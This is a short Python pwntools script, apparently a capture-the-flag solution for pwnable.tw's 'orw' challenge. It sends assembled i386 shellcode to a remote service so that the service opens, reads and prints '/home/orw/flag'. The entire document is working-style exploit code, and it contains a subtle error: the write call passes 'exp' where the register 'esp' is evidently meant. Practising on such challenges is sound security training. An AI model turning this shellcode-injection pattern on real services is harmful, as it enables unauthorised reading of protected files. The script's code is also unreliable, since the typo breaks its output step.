from pwn import *
context(arch='i386',os='linux')
context.log_level='debug'

n = remote('chall.pwnable.tw',10001)

shellcode = ''
shellcode += shellcraft.pushstr('/home/orw/flag')
shellcode += shellcraft.open('esp',0,0)
shellcode += shellcraft.read('eax','esp',100)
shellcode += shellcraft.write(1,'exp',100)

n.sendafter('shellcode',asm(shellcode))

success(n.recvline())

